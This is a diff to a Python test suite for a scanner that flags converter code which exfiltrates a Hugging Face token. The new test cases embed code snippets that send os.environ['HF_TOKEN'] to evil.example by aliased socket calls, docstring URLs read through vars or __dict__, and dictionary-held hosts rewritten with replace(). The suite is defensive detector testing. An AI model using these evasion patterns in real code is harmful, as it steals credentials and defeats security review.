@@ -3176,6 +3176,12 @@ def test_a_host_based_network_api_refuses_the_hub_allowance():
         'import os\nimport requests\nfrom urllib.parse import unquote\n' + hub
         + 'url = unquote("https%3A%2F%2Fevil.example%2Fcollect")\n'
         + 'requests.get(url, headers = {"a": os.environ["HF_TOKEN"]})\n',
+        # An aliased import leaves it only s.create_connection, which it does
+        # not recognise either.
+        'import os\nimport requests\nimport socket as s\n' + hub
+        + 'requests.get(HUB)\n'
+        + 'c = s.create_connection(("evil.example", 443))\n'
+        + 'c.sendall(os.environ["HF_TOKEN"].encode())\n',
         # A from-import leaves nothing for a qualified-name pattern to match.
         'import os\nimport requests\nfrom socket import create_connection\n' + hub
         + 'requests.get(HUB)\n'
@@ -3659,6 +3665,36 @@ def test_a_documentation_url_in_a_docstring_is_not_a_destination():
             'requests.get(getattr(fetch, "__doc__") + os.environ["HF_TOKEN"])\n'
         )
     ]
+    # Enumerating the spellings was losing, so anything naming __doc__,
+    # vars or __dict__ at all keeps docstrings in the scan.
+    for reader in (
+        'vars(fetch)["__doc__"]',
+        'fetch.__dict__.get("__doc__", "")',
+        'getattr(fetch, "__doc__")',
+    ):
+        assert [
+            f.check for f in scan_converter_source(
+                'import os\n'
+                'import requests\n'
+                'HUB = "https://huggingface.co"\n'
+                'def fetch():\n'
+                '    """https://evil.example/collect"""\n'
+                f'requests.get({reader} + os.environ["HF_TOKEN"])\n'
+            )
+        ], reader
+    # A key this cannot read is why the readers are named at all: the
+    # constant __doc__ never appears here, only vars does.
+    assert [
+        f.check for f in scan_converter_source(
+            'import os\n'
+            'import requests\n'
+            'HUB = "https://huggingface.co"\n'
+            'def fetch():\n'
+            '    """https://evil.example/collect"""\n'
+            'key = "__" + "doc" + "__"\n'
+            'requests.get(vars(fetch)[key] + os.environ["HF_TOKEN"])\n'
+        )
+    ]
     # And a bare string statement is not a docstring.
     assert [
         f.check for f in scan_converter_source(
@@ -3933,6 +3969,16 @@ def test_the_hub_allowance_reads_the_real_hostname():
         'C.B = "https://huggingface.co"\n'
         'url = C.B.replace("huggingface.co", "evil.example")\n'
     )
+    # A dictionary is a container like the others, and a lookup by name reads
+    # the value out rather than taking the string apart, so the carrier passes
+    # through it while a benign dictionary of hub URLs stays readable.
+    assert _reshaped(
+        'URLS = {"hub": "https://huggingface.co"}\n'
+        'url = URLS["hub"].replace("huggingface.co", "evil.example")\n'
+    )
+    assert _reshaped(
+        'URLS = {"hub": "https://huggingface.co"}\nurl = URLS["hub"]\n'
+    ) == []
     # Unpacking hub URLs and using one as written is not a reshape.
     assert _reshaped(
         'A, url = ("https://huggingface.co/api", "https://huggingface.co")\n'
